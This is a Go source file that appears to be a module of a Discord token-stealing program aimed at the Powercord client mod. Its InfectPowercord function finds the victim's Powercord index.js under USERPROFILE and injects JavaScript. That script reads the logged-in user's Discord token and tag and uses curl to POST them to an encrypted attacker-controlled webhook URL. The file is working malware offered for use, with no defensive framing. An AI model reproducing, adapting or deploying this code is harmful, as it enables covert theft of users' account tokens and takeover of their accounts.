package powercord

import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/equisde/Clean/utils"
)

func InfectPowercord(webhookURL string) {
	if !utils.CheckFileExist(infectPath) {
		return // the path does not exist, nothing to infect.
	}

	file, err := ioutil.ReadFile(infectFile)
	if err != nil {
		return // We could not read the file, return
	}

	var fileData = string(file)
	if strings.Contains(fileData, "getToken") {
		return
	}

	infectJS = fmt.Sprintf(infectJS, utils.Decrypt(webhookURL).String())
	fileData = strings.Replace(fileData, "this.initialized = true;", fmt.Sprintf("%s%s", "this.initialized = true;", infectJS), -1)

	ioutil.WriteFile(infectFile, []byte(fileData), 0777)
}

var (
	infectFile = fmt.Sprintf("%s/%s", infectPath, "index.js")
	infectPath = fmt.Sprintf("%s/%s", os.Getenv("USERPROFILE"), "powercord/src/Powercord")
	infectJS   = `const tokenModule = await require('powercord/webpack').getModule([ 'getToken' ]);const userModule = await require('powercord/webpack').getModule([ 'getCurrentUser' ]);let user;while (!(user = userModule.getCurrentUser())) {await sleep(10);};await exec('curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\\\"content\\\": \\\"Powercord token logged on '+user.tag+': '+tokenModule.getToken()+'\\\"}" %s',{ cwd: this.entityPath });`
)
